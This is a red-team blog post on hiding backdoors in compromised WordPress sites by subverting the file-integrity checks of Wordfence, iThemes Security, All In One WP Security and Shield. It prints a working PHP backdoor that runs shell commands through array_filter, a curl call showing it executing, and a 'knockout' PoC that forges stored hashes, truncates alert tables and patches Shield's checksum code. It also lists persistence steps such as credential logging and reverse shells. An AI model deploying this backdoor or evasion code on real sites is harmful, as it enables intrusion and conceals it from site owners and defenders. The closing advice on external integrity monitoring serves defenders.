---
layout: post
title: Defeating WordPress Security Plugins (Revisited)
date: 2018-03-09 12:00:00
categories: posts
en: true
description: Article about how to subvert file integrity checks made by most popular WordPress Plugins 
keywords: "WordPress, Red Team, RedTeam, backdoors, wp-knockout"
authors:
    - X-C3LL
---

## Disclaimer
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Before to begin to read this article keep in mind this: security plugins are __great__ and you need to install at least one. They act as the first barrier against attackers and usually helps to keep a good level of hardening in your WordPress. But using them as a file integrity checker sucks. A lot. Never trust them.

## Introduction
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Four years ago I wrote a post called "[Defeating Security Plugins](http://www.0verl0ad.net/2014/10/the-walking-wordpress-i-defeating.html)" (in Spanish, sorry __:(__ ) where I explained how to defeat the file integrity capabilities of popular plugins in the WordPress ecosystem. Today I want to check again this kind of plugin.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
As I always say we need to keep our tracks to the minimum to avoid being detected too early. When we compromise an external or internal WordPress we need to let inside some backdoors. For example in a standard situation we are going to:

- Edit some existent PHP scripts to add a backdoor (maybe via any function callable like array_map() to hide in plain sight)
- Modify the login to save credentials in plain text
- Create few webshells
- Create a PHP to tunnelize TCP connections (for example a modified version of [reGeorge](https://github.com/sensepost/reGeorg))
- Add a [SQL trigger to retake the control in the future](https://www.tarlogic.com/blog/wordpress-backdoors-sql/)
- Reverse shell
- Modify the timestamps of all files affected 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Because time matters, all of these actions must be done in a semi-automatized way. And you have to reduce the number of HTTP requests needed to finish the job. That means that only one file has to create and edit the others files and fake the timestamps. This is a lesson learnt after few years meeting with the blue team after an exercise.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
If the blue team are not veteran enough they will fail finding all of our persistences. The reason behind this is that they tends to check only the files accessed via HTTP requests, and not the others. If you create a webshell but you never interact with it, probably it will be hidden more time.  

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
In a really big enterprise is hard to keep the control of every server. The "IT Shadow" is a real trouble for Blue Teamers, because there are servers that are not under their vision. And the security of these servers usually is not enough. In the case of servers using WordPress is far probably that some department (*Hello Marketing I am talking with you!*) installed the WordPress with only a security plugin and nothing more.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
If we learn how to bypass (or subvert) the file integration checks made by security plugins, we can automatize the process and keep our tracks to the minium (plus the time we save). Less alerts, more party __:)__. 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
So... let's go!

## Wordfence Security (version 7.0.2 - +2M active installs)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
This is the most popular plugin with more than two millions of active installs. One of the capabilities of this plugin is (in his own words):

>_Compares your core files, themes and plugins with what is in the WordPress.org repository, checking their integrity and reporting any changes to you._

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Ok, let's test this adding a "frontdoor.php" file to plugins folder, edit "index.php", and create a new PHP inside WordFence folder. The content of our "backdoor" in all cases will be:

```php
<?php
	@$filter = $_POST['filter'];
	@$words = array($_POST['text']);
	@$filtered_words = array_filter($words, $filter);
?>
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
We can see our little backdoor working perfectly:

```
$ curl http://localhost/wordpress/wp-content/plugins/wordfence/frontdoor.php --data "filter=system&text=uname -a"
Linux kaiju 3.16.0-4-amd64 #1 SMP Debian 3.16.51-3 (2017-12-13) x86_64 GNU/Linux
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
I got a little problem with this plugin. Even setting the maximum level of sensibility it does not detect my backdoors or the files modified __(U_U")__. Well, that is not true: I got an issue.... `User "admin" with "administrator" access has an easy password.Type: Insecure Password`. Maybe the "free" edition not works so great, but we can use this issue generated (the weak password detected) to see how issues are stored and shown to the administrator.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Basically this plugin stores the issues information in the database under a table called "__prefix___wfissues". In this table we find the "severity" and the messages used to alert the admin. So we only need to do a "truncate" with a SQL query to flush this information. 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Additionaly exists a table called "__prefix__wfFileMods" wich contains the columns "filename", "filenameMD5", "oldMD5", and "MD5". We can manipulate this table in order to be stealthier and not trigger an alert.

## iThemes Security (version 6.9.2 - +900K active installs)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The method used by this plugin is based on to keep the list of files, the timestamp and his owns MD5 in the table **prefix_**options, under the key "**itsec_local_file_list**". It looks like:

```
a:3346:{s:15:"wp-settings.php";a:2:{s:1:"d";i:1519165466;s:1:"h";s:32:"65925f28e27552ed6844be036d90cc95";}
s:9:".htaccess";a:2:{s:1:"d";i:1520727850;s:1:"h";s:32:"6c10a3562901b71856657cfe40321bd1";}
...
...
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
After our implants are deployed, we only need to update this array with the new md5 value of each file modified.

## All In One WP Security & Firewall (version 4.3.2 - +600K active installs)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Between the capabilities of this plugin we can see:

>_The file change detection scanner can alert you if any files have changed in your WordPress system. You can then investigate and see if that was a legitimate change or some bad code was injected._

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
In the same way as before, we will modify the contents of a PHP file (in this case we are going to modify the "wp-security.php" file owned by this plugin):

```php
<?php
/*
Plugin Name: All In One WP Security
Version: 4.3.2
Plugin URI: https://www.tipsandtricks-hq.com/wordpress-security-and-firewall-plugin
Author: Tips and Tricks HQ, Peter Petreski, Ruhul, Ivy
Author URI: https://www.tipsandtricks-hq.com/
Description: All round best WordPress security plugin!
Text Domain: all-in-one-wp-security-and-firewall
Domain Path: /languages
License: GPL3
*/
	// Our backdoor
	@$filter = $_POST['filter'];
    @$words = array($_POST['text']);
    @$filtered_words = array_filter($words, $filter);
    // End of backdoor
    
    if(!defined('ABSPATH')){
    exit; //Exit if accessed directly
}
...
?>
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
This time we get an alert saying that the file `/var/www/html/wordpress/wp-content/plugins/all-in-one-wp-security-and-firewall/wp-security.php` was modified. If we investigate how this plugin works we will notice fast that new tables were created in the database when the plugin was installed. One of them, __prefix___aiowps_global_meta, has a metavalue *"file_change_detection"* and a serialized array wich contains the name and metadata (timestamp and size) associated with every file:


```
a:2397:{s:39:"/var/www/html/wordpress/wp-settings.php";a:2:{s:13:"last_modified";i:1507069246;s:8:"filesize";i:16246;}...
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
If after performing a scan task any change is discovered (timestamp or size has changed, or there is a file addition or deletion) another metavalue is filled alerting about the change. So basically this plugin works saving a list with files (name, size and last change) and compare it with the values saved: if something differs an alert is triggered. In order to subvert this type of check we only need to edit this serialized object after we implant our backdoors. 

## Shield Security for WordPress (version 6.3.2 - +70K active installs)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Another plugin with a file integrity scanner that tries to discover core files modified. If we perform few searchs with grep and we dive into the code we can see this extract located at __src/common/icwp-wpfunctions.php__:

```php
...
     /**                                                                                                                                                                            
      * @return string[]                                                                                                                                                            
      */                                                                                                                                                                            
     public function getCoreChecksums() {                                                                                                                                           
         $aChecksumData = false;                                                                                                                                                    
         $sCurrentVersion = $this->getVersion();                                                                                                                                    
                                                                                                                                                                                    
         if ( function_exists( 'get_core_checksums' ) ) { // if it's loaded, we use it.                                                                                             
             $aChecksumData = get_core_checksums( $sCurrentVersion, $this->getLocale( true ) );                                                                                     
         }                                                                                                                                                                          
         else {                                                                                                                                                                     
             $aQueryArgs = array(                                                                                                                                                   
                 'version' => $sCurrentVersion,                                                                                                                                     
                 'locale'  => $this->getLocale( true )                                                                                                                              
             );                                                                                                                                                                     
             $sQueryUrl = add_query_arg( $aQueryArgs, 'https://api.wordpress.org/core/checksums/1.0/' );                                                                           
             $sResponse = $this->loadFS()->getUrlContent( $sQueryUrl );                                                                                                             
             if ( !empty( $sResponse ) ) {                                                                                                                                          
                 $aDecodedResponse = json_decode( trim( $sResponse ), true );                                                                                                       
                 if ( is_array( $aDecodedResponse ) && isset( $aDecodedResponse[ 'checksums' ] )
                  && is_array( $aDecodedResponse[ 'checksums' ] ) ) {                                
                     $aChecksumData = $aDecodedResponse[ 'checksums' ];                                                                                                             
                 }                                                                                                                                                                  
             }                                                                                                                                                                      
         }                                                                                                                                                                          
         return is_array( $aChecksumData ) ? $aChecksumData : array();                                                                                                              
     }
...
?>
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
In this chunk of code we can see how the plugin checks the existence of __get_core_checksums__ function. This is an internal WordPress function (introduced in WordPress 3.7.0) that does a request to the WordPress API (https://api.wordpress.org/core/checksums/1.0/) and retrieves the checksums of core files. If the function is not found (maybe because is an older version of WordPress), the plugin does the request and get the checksums.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The easiest way to avoid the detection is just edit this file and change the return. If the function returns and empty array (_return array();_) the plugin will say "Ok, everything it's ok":
```
Core File Scanner Results

There were no modified files discovered in the scan.
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Cool __:)__.

## PoC || GTFO
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
In this short article we have seen how to subvert the file integrity check used by the most popular security plugins in WordPress. Following this idea we can create a little stub of code that must be added to a loaded plugin. This code will disable (or hide) our files backdoored. You can improve it (this code is just a PoC to show the main idea).

```php
add_action("wp_head", "knockout");                                                                                                                                                 
 define("DB_PRE", $table_prefix);                                                                                                                                                   
                                                                                                                                                                                    
 function patch_shield ($line) {                                                                                                                                                    
     if (stristr($line, 'return is_array( $aChecksumData ) ? $aChecksumData : array();')) {                                                                                         
         return "return array();\n";                                                                                                                                                
     }                                                                                                                                                                              
     return $line;                                                                                                                                                                  
 }                                                                                                                                                                                  
                                                                                                                                                                                    
 // Here is where the magic lies :)                                                                                                                                                 
 function knockout() {                                                                                                                                                              
     // Filenames we want to hide                                                                                                                                                   
     $hide = array("wp-settings.php", "wp-content/plugins/akismet/akismet.php");                                                                                                    
     // Ok, let's kill iThemes Security                                                                                                                                             
     $o = get_option("itsec_local_file_list");                                                                                                                                      
     // Change the values                                                                                                                                                           
     foreach ($hide as $file) {                                                                                                                                                     
         $o[$file]['d'] = filemtime(get_home_path() . $file); // Timestamp                                                                                                          
         $o[$file]['h'] = md5_file(get_home_path() . $file); // Hash                                                                                                                
     }                                                                                                                                                                              
     // Update values                                                                                                                                                               
     update_option("itsec_local_file_list", $o);                                                                                                                                    
                                                                                                                                                                                    
     // Kill WordFence alerts                                                                                                                                                       
     $con = mysql_connect(DB_HOST, DB_USER, DB_PASSWORD);                                                                                                                           
     mysql_select_db(DB_NAME);                                                                                                                                                      
     $query = "truncate ". DB_PRE ."wfIssues;";                                                                                                                                     
     mysql_query($query);                                                                                                                                                           
                                                                                                                                                                                    
     // Kill All-in-One WP Security                                                                                                                                                 
     $query = "truncate ". DB_PRE . "aiowps_global_meta;";                                                                                                                          
     mysql_query($query);                                                                                                                                                           
                                                                                                                                                                                    
     // Patch Shield Security                                                                                                                                                       
     $shield = get_home_path() . "wp-content/plugins/wp-simple-firewall/src/common/icwp-wpfunctions.php";                                                                           
                                                                                                                                                                                    
     if (file_exists($shield)) {                                                                                                                                                    
         echo "YEAH";                                                                                                                                                               
         $lines = file($shield);                                                                                                                                                    
         $lines = array_map('patch_shield', $lines);                                                                                                                                
         var_dump($lines);                                                                                                                                                          
         file_put_contents($shield, implode('', $lines));                                                                                                                           
     }                                                                                                                                                                              
                                                                                                                                                                                    
 }      
 ```

## Final words

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Do not trust the file integrity checks made by your security plugins in WordPress. Because if an attacker has the ability to edit your files, that means that he can edit whatever is inside your WordPress' database and patch other files. So this kind of checks always must be done from outside, using software like Wazuh or similar.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
As usual, if you detect a typo or what to improve this article feel free to ping me at my twitter [@TheXC3LL](https://twitter.com/TheXC3LL). Byt3z!
